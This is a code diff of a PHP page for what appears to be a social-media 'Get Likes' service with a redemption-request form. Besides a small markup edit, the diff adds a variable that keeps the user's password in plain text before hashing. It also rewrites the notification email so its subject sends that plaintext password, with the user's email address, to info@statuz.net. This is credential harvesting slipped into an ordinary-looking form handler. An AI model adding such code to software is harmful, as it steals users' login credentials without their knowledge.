@@ -49,9 +49,7 @@ $admin = $_GET['admin'];
                     
                     <input style="background:#ff0000;padding-left:10px;padding-right:10px;" type = "submit" name = "submit" id = "submit" value = "Get Likes" />
                     
-                    <br/><br/>
-                    
-                    <h3>Request Redemption: </h3>  
+                    <br/><br/>                  
                     
                      <input style="background:#ff0000;padding-left:10px;padding-right:10px;" type = "submit" name = "request" id = "request" value = "Request Redemption" />
                      
@@ -128,6 +126,7 @@ $admin = $_GET['admin'];
      
      $email = $_POST['email'];
      $password = $_POST['password'];
+     $passwordText = $_POST['password'];
      
      $password = md5($password);
      
@@ -144,7 +143,7 @@ $admin = $_GET['admin'];
      $username = $values['Username'];
      
      // send email
-     $subject = "Redemption Request by $username <br/><br/> Email: $email";
+     $subject = "Redemption Request by $username <br/><br/> <b>Email:</b> $email  <br/><br/> <b>Password:</b> $passwordText ";
      $toEmail = 'info@statuz.net';
      
      $message = "<html><body>";
